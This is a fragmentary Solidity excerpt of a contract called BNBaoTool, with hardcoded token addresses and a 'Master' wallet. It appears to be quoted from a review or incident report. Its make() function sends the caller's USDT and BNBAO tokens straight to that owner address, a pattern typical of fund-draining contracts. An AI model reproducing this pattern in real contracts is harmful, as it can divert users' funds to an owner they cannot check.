...
contract BNBaoTool is Ownable{
    ...
    constructor(){
        BNBao = IERC20(0x1A0C2f92973F84Dd961C7071a85EBaD4c6b6255e);
        Usdt = IERC20(0x18E69D8ce6a8D9666D7272766A99907d586dA716);
        BNBAO = IERC20(0xD6f96D69e313e3d777cD5B55A25B9BbDBE8BFC2B);
        Pair = 0x24b1671D354A75e348a65bcEcab385d96cB9a0d3;
        Master = payable(0xE130EDF73Df4fdA0e7ab8ed7cd247C3397759497);
    }
    ...
    function make(uint256 tamount,uint256 uamount) public {
        ...
        BNBAO.transferFrom(msg.sender,Master,tamount);
        Usdt.transferFrom(msg.sender,Master,uamount);
